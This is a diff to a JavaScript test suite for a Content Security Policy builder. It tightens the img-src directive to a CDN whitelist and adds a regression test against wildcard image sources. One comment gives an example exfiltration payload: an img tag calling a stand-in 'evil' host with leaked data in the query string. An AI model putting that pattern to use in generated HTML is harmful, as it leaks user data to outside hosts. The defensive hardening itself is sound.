@@ -31,9 +31,20 @@ describe("buildHtmlPreviewCsp", () => {
     assert.ok(csp.includes("connect-src 'none'"));
   });
 
-  it("allows images from anywhere plus data: and blob:", () => {
+  it("allows images from self + CDN whitelist + data: and blob:", () => {
     const csp = buildHtmlPreviewCsp();
-    assert.ok(csp.includes("img-src * data: blob:"));
+    assert.ok(
+      csp.includes(
+        "img-src 'self' https://cdn.jsdelivr.net https://unpkg.com https://cdnjs.cloudflare.com https://fonts.googleapis.com https://fonts.gstatic.com data: blob:",
+      ),
+    );
+  });
+
+  it("rejects the wildcard img-src policy to prevent image-based exfiltration", () => {
+    const csp = buildHtmlPreviewCsp();
+    // Explicit regression guard: `img-src *` would allow
+    // `<img src="https://evil/?leak=...">` even with connect-src blocked.
+    assert.ok(!/img-src \*/.test(csp));
   });
 
   it("accepts a custom CDN list", () => {
